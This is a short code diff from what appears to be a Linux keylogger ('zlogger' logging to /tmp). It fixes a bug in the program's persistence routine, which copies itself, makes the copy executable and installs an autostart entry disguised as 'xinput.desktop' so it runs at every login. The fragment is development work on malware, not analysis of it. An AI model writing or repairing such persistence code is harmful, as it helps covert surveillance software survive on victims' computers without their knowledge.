@@ -15,6 +15,7 @@ SLEEP_INTERVAL = 30
 LOG_FILE = "/tmp/zlogger.txt"
 
 HOME_DIRECTORY = os.path.expanduser('~')
+
 AUTOSTART_ENTRY = """
 [Desktop Entry]
 Type=Application
@@ -58,11 +59,9 @@ def initialize():
 	copyfile(current_file, destination_file)
 	chmod_to_exec(destination_file)
 
-	AUTOSTART_ENTRY = AUTOSTART_ENTRY + "Exec=" + destination_file + "\n"
-
 	autostart_file = autostart_path + "xinput.desktop"
 	with open(autostart_file,'w') as out:
-	    out.write(AUTOSTART_ENTRY)
+	    out.write(AUTOSTART_ENTRY + "Exec=" + destination_file + "\n")
 
 	chmod_to_exec(autostart_file)
 
